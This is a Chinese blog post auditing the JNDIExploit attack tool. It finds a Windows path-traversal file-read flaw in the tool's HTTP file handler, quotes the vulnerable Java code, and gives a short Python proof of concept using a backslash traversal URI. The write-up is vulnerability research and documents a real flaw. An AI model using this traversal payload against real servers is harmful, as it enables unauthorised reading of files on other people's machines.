<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QvdLy5RteHJQnVmDMYiohA)

  

0x0 前言
------

一款用于 `JNDI注入` 利用的工具，大量参考 / 引用了 `Rogue JNDI` 项目的代码，支持直接`植入内存shell`，并集成了常见的`bypass 高版本JDK`的方式，适用于与自动化工具配合使用。打过 log4j2 的师傅应该都不陌生，这里先简单介绍一下。我这里使用的是 https://github.com/WhiteHSBG/JNDIExploit   （1.4 版本）

0x1 代码审计
--------

![](https://mmbiz.qpic.cn/mmbiz_png/vvdWdsCFXNicibQibXzvr9TB9FlXseGumLImhkRjosPtgibdW89ML5WqGHNmywjNy9MctoTrrL1Gq6Y7QJtXzibTzVA/640?wx_fmt=png)

问题出在下面这个类

```
src/main/java/com/feihong/ldap/HTTPServer.java


```

直接定位到

```
private static void handleFileRequest(HttpExchange exchange) throws Exception {
       String path = exchange.getRequestURI().getPath();
       String filename =  cwd + File.separator + "data" + File.separator +path.substring(path.lastIndexOf("/") + 1);
       File file = new File(filename);
       if (file.exists()){
           byte[] bytes = new byte[(int) file.length()];
           FileInputStream fileInputStream = new FileInputStream(file);
           fileInputStream.read(bytes);
           exchange.sendResponseHeaders(200, file.length() + 1);
           exchange.getResponseBody().write(bytes);
       }else {
           System.out.println("[!] Response Code: " + 404);
           exchange.sendResponseHeaders(404, 0);
       }
       exchange.close();

   }


```

1.  `exchange.getRequestURI().getPath()`：从 HTTP 请求中获取请求的 URI 路径。
    
2.  `String filename = cwd + File.separator + "data" + File.separator +path.substring(path.lastIndexOf("/") + 1)`：构建文件的完整路径。它使用了当前工作目录 (`cwd`)，然后附加了固定的目录名称 "data"，最后附加了从 URI 路径中提取的文件名部分（通过找到最后一个斜杠 `/` 来获取文件名）。
    

请求中找到路径中的最后一个斜杠（/），然后把它和当前的工作目录拼接在一起。但在 Windows 系统中，文件路径一般是用反斜杠（\）来表示的。所以，在 Windows 上运行，存在文件读取漏洞。

0x2 poc
-------

```
uri = '/..\\..\\..\\..\\..\\1.txt'
target = "localhost:port"
r = requests.get(target+uri)


```

![](https://mmbiz.qpic.cn/mmbiz_png/vvdWdsCFXNicibQibXzvr9TB9FlXseGumLIThIPUtH4XLBhvcJ1MNZcGs59ULbiame6xlgFRDSWcXGWWMYJsQBGiaDw/640?wx_fmt=png)

可以看到，我先是起了一个 jndi 服务，然后 python 访问，成功读取到了我 F 盘下的 1.txt 文件。

0x3 总结
------

想必利用场景大家一下子就可以想到 hvv 中的溯源，与冰蝎的任意文件读取类似。不过利用场景有限，只支持 windows。用这款工具的大部分都会在 linux 下部署，因此，利用场景应该没那么大。